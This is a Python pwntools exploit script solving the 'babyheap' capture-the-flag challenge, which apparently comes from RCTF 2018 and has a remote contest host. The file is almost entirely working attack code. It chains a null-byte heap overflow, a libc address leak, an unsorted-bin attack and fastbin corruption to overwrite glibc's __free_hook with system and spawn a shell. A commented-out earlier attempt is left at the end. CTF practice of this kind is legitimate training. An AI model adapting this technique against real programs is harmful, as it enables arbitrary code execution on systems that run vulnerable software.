from pwn import *
g_local = True
e = ELF("./libc.so.6")

def padding(length):
	assert length % 8 == 0
	return (p64(0x1234) * (length/8))[:length-1] + "\n"

command = "/bin/sh\x00" + padding(0xf0)

if g_local:
	sh=process("./babyheap")
else:
	sh=remote('babyheap.2018.teamrois.cn',3154)



def alloc(data):
	size = len(data)
	sh.send("1\x00")
	sh.recvuntil("please input chunk size: ")
	sh.send(str(size) + "\x00")
	sh.recvuntil("input chunk content: ")
	sh.send(data)
	sh.recvuntil("choice: ")

def show(idx):
	sh.send("2\x00")
	sh.recvuntil("please input chunk index: ")
	sh.send(str(idx) + "\x00")
	sh.recvuntil("content: ")
	ret = sh.recvuntil("choice: ")
	return ret[:ret.find("\n")]

def delete(idx):
	sh.send("3\x00")
	sh.recvuntil("please input chunk index: ")
	sh.send(str(idx) + "\x00")
	sh.recvuntil("choice: ")

#initialize chunks
assert len(command) == 0xf8
alloc(command) #0
alloc(padding(0x100)) #1
alloc(padding(0x100)) #2
alloc(padding(0x100)) #3
alloc(padding(0x100)) #4 seperator
alloc(command) #5
alloc(padding(0x100)) #6
alloc(padding(0x100)) #7
alloc(padding(0x60)) #8 seperator


#first phase of exploitation: leak
delete(0)
delete(1)
delete(2)

alloc("/bin/sh\x00" + "A" * 0xf0) #0 overflow size to 0x100
alloc(padding(0xf0)) #1
alloc(padding(0xf0)) #2

delete(1)
delete(3)
#null poison triggered

alloc(padding(0xf0)) #1
alloc(padding(0xf0)) #3

#now 2 and 3 points to same heap address

delete(3)
libc = u64(show(2) + "\x00\x00") - 0x3c4b78
print hex(libc)
alloc(padding(0x100)) #3
alloc(padding(0x80)) #9
alloc(padding(0x80)) #10
#clear unsorted bin for next exploitation

#now >= 11 is empty
#second phase of exploitation: getshell

delete(5)
delete(6)

alloc(p64(0x1234) * (0xf8/8)) #5, null byte overflow here
alloc(padding(0x80)) # 6
#b1

alloc(padding(0x60)) # 11
delete(11)
#put this b2 chunk into fastbin

delete(6)
delete(7)
#trigger null poison


alloc("A" * 0x80 + p64(0) + p64(0x70)[:7] + "\n") #6
#now next chunk that will be allocated from unsorted bin is 0x60 in fastbin + 0x10
alloc(p64(0) + p64(0x71) + p64(libc + 0x3c4b78) + \
	p64(libc + e.symbols["__free_hook"] - 13 - 0x10) + padding(0x40))
	#7, from fastbin, which can write unsorted bin bk

alloc(padding(0x60)) #11, from unsorted bin, which is unsorted bin attack
#now unsorted bin is corrupted, can't be used anymore

#now &7 + 0x10 == &11, and they belong to fastbin size range
# >=14 empty, bins are all empty


#-----------


delete(11)
delete(7)

alloc(p64(0) + p64(0x71) + p64(libc + e.symbols["__free_hook"] - 0x10) + padding(0x48))
alloc(padding(0x60))
alloc(p64(libc + e.symbols["system"]) + padding(0x58))


sh.send("3\x00")
sh.recvuntil("please input chunk index: ")
sh.send(str(0) + "\x00")

sh.interactive()


#now in 0x70 fastbin, it is a -> b -> a -> ... form

#now do fastbin dup into __malloc_hook
#7 and >=11 are NULL




# alloc(command) #14
# alloc(padding(0x100)) #15
# alloc(padding(0x100)) #16
# alloc(padding(0x100)) #17
# alloc(padding(0x100)) #18 seperator

# delete(14)
# delete(15)
# delete(16)

# alloc("A" * 0xf8) #14 overflow size to 0x100
# alloc(padding(0xf0)) #15
# alloc(padding(0xd0)) #16
# #alloc(padding(0x10)) #
# #now there is a size 0x20 chunk in unsorted bin


# delete(15)
# delete(17)
# #null poison triggered
# #delete(16)

# sh.interactive()
# alloc(padding(0xf0)) #15
# alloc(padding(0xf0)) #17


# #clear unsorted bin
# alloc(padding(0x80)) #19
# alloc(padding(0x90)) #20


# #now 16 and 17 points to same heap address
# # >=21 empty, bins are empty

# sh.interactive()